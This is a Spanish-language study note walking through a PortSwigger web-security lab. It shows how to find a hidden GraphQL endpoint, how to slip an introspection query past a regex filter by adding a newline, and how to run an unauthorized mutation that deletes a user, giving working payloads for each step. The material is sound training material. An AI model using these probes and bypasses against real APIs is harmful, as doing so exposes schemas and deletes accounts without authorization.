---
aliases:
  - GraphQL 003 - endpoint oculto + bypass de introspection
  - graphql introspection bypass hidden endpoint
tags:
  - vuln/graphql
  - example
  - portswigger
---

# 003 — Endpoint oculto + bypass de introspection + mutation

> Lab: [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint) · **Practitioner** · técnica → [[vulnerabilities/021-graphql/graphql|entry point]]

## ¿Por qué acá? (cuando esconden el endpoint y filtran el schema)
- **Suben una defensa:** el endpoint no está en `/graphql` obvio y un **filtro regex** bloquea `__schema{`. Dos obstáculos antes de poder mapear.
- **Por qué se rompe:** el filtro es un **regex ingenuo** → un **salto de línea** después de `__schema` deja de matchear y la introspection pasa igual.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target y el `id` de carlos).

**1) Encontrá el endpoint** — probá `POST`/`GET` a los paths típicos con la sonda universal:
<pre class="payload"><code>/api   /graphql   /graphql/api   /graphql/v1   /api/graphql</code></pre>
<pre class="payload"><code>{"query":"{__typename}"}</code></pre>
El que responde `{"data":{"__typename":"query"}}` es el bueno.

**2) Bypass del filtro** — meté un **newline** después de `__schema`:
<pre class="payload"><code>query { __schema
{ queryType { name } types { name fields { name } } } }</code></pre>

**3)** Con el schema, sacá el `id` de `carlos` y corré la mutation de borrado:
<pre class="payload"><code>mutation {
  deleteOrganizationUser(input: { id: <mark>CARLOS_ID</mark> }) {
    user { id username }
  }
}</code></pre>
> Ya armada en el script → `vulnerabilities/021-graphql/scripts/execute-graphql.py`.

## Verificación
La sonda `{__typename}` confirma el endpoint; la query con newline devuelve el schema completo; tras la mutation **carlos desaparece** → lab resuelto.

## Detalles que se pasan por alto
- Otros bypass del mismo regex: `__schema` + **espacio/coma**, o pedir la introspection por **GET** URL-encoded.
- El paso 1 (fuzzeo de paths + `{__typename}`) sirve **siempre** para ubicar cualquier endpoint GraphQL, no solo en este lab.
- La autz de la mutation está rota igual que las queries: `delete*` corre sin sesión de admin.

→ Siguiente: [[vulnerabilities/021-graphql/examples/004-brute-force-aliases-rate-limit|004 · brute force sin rate limit batcheando con alias]]
